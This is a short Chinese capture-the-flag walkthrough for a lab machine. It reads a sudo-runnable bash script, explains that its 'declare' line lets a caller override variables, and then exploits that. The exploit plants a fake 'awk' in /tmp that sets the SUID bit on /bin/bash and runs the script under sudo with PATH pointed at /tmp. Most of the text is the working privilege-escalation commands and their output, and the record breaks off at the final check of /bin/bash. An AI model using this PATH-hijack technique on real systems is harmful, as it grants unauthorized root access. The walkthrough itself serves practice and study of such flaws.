有sudo权限，看一下源码

welcome@113:/opt$ cat 113.sh
#!/bin/bash

sandbox=$(mktemp -d)
cd $sandbox

if [ "$#" -ne 3 ];then
        exit
fi

if [ "$3" != "mazesec" ]
then
        echo "\$3 must be mazesec"
        exit
else
        /bin/cp /usr/bin/mazesec $sandbox
        exec_="$sandbox/mazesec"
fi

if [ "$1" = "exec_" ];then
        exit
fi

declare -- "$1"="$2"
$exec_

这个脚本存在两个主要的安全漏洞：变量覆盖和拼写错误

if [ "$#" -ne 3 ]：必须提供3个参数。
if [ "$3" != "mazesec" ]：第3个参数（$3）必须严格等于 mazesec。
if [ "$1" = "exec_" ]：第1个参数不能是 exec_（但可以是 exec）。

如果任意执行的话，会输出一个错误的flag

看一下/usr/bin/mazesec内容

welcome@113:/opt$ cat /usr/bin/mazesec
#!/bin/bash

flag=$(echo $RANDOM$RANDOM$RAMDOM$RANDOM | md5sum | awk '{print $1}')
echo "flag{fakeroot-$flag}"

简单明了了，直接劫持awk命令即可

welcome@113:/tmp$ cd /tmp
welcome@113:/tmp$ echo '#!/bin/bash' > awk
welcome@113:/tmp$ echo '/bin/chmod u+s /bin/bash' >> awk
welcome@113:/tmp$ chmod +x awk
welcome@113:/tmp$ sudo /opt/113.sh PATH /tmp mazesec
/tmp/tmp.l0IQNEleXC/mazesec: line 3: md5sum: command not found
flag{fakeroot-}
welcome@113:/tmp$ ls -al /bin/bash
